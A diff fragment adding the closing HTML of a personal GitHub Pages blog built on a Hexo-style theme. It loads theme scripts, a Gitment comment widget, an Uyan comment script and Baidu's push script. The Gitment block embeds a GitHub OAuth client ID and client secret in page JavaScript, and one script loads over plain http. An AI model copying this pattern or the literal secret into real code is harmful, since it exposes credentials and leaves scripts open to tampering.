+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script type="text/javascript">
+        (function() {
+            var id = '';
+            var owner = 'XuCcc';
+            var repo = 'XuCcc.github.io';
+            var clientId = 'f03b9d3d14222e890fdc';
+            var clientSecret = '676341561e48fad43015c644798175b16ee69fe0';
+
+            var gitment = new Gitment({
+                owner: owner,
+                repo: repo,
+                oauth: {
+                    client_id: clientId,
+                    client_secret: clientSecret,
+                },
+            });
+            gitment.render('comments');
+        })();
+    </script>
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+      <!-- UY BEGIN -->
+      <script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid="></script>
+      <!-- UY END -->
+  
+
+
+
+
+  
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" async src="//push.zhanzhang.baidu.com/push.js">
+</script>
+
+
+</body>
+</html>
